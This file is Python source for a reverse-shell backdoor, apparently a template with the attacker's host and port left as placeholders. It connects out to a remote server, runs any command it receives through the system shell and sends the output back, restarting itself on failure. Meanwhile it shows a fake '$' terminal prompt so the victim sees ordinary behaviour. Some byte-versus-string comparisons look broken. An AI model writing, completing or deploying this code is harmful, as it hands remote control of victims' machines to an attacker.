import socket
import subprocess
import os
import sys
try:
    import multitasking

except:
    os.system('pip install multitasking')
    import multitasking

s = socket.socket()
n = '\n'
n = n.encode()

def program_restart():
        python = sys.executable
        os.execl(python, python, * sys.argv)
        curdir = os.getcwd()

def try_connect():
    while True:
        try:
            #print("[i] T6Y1NG 70 C0NN3C7...") # Debug only
            s.connect(('{}', {}))
            break

        except ConnectionRefusedError:
            pass

        except:
            pass

@multitasking.task
def main():
    try_connect()
    while True:
        try:
            #print("[i] W3 463 N0W C0NN3C73D 70 7H3 S36V36!") # Debug only
            cmd = s.recv(100000)
            if cmd[:2] == 'cd':
                os.chdir(cmd[3:])
                dir = os.getcwd()
                s.sendall('bacod')
    
            elif cmd == 'kernel_info':
                results = subprocess.Popen('cat /proc/version', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                results = results.stdout.read() + results.stderr.read()
                try:
                    s.sendall(results)
    
                except:
                    program_restart()
    
            else:
                results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                results = results.stdout.read() + results.stderr.read()
                try:
                    s.sendall(n+results)

                except:
                    program_restart()

        except(BrokenPipeError, OSError):
            program_restart()

        except:
            program_restart()

if sys.platform == 'nt':
    os.system('cls')

else:
    os.system('clear')

while True:
    try:
        main()
        front = input("$ ")
        if sys.argv[0] in front:
            continue

        else:
            os.system(front)

    except:
        continue
